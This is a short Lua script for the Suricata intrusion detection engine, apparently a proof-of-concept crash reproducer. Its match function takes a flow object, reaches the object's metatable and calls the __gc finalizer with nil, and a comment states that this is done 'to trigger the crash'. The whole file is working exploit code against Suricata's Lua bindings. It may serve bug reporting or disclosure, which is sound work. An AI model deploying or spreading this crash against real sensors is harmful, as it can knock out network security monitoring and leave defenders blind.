local sf = require "suricata.flow"

function init(args)
    local needs = {}
    needs["packet"] = "true"
    return needs
end

function match(args)
    -- 1. Get a valid flow object
    local f = sf.get()

    if f then
        -- 2. Access its metatable
        local mt = getmetatable(f)

        if mt and mt.__gc then
            -- 3. Manually call __gc with nil to trigger the crash
            mt.__gc(nil)
        end
    end
    return 1
end
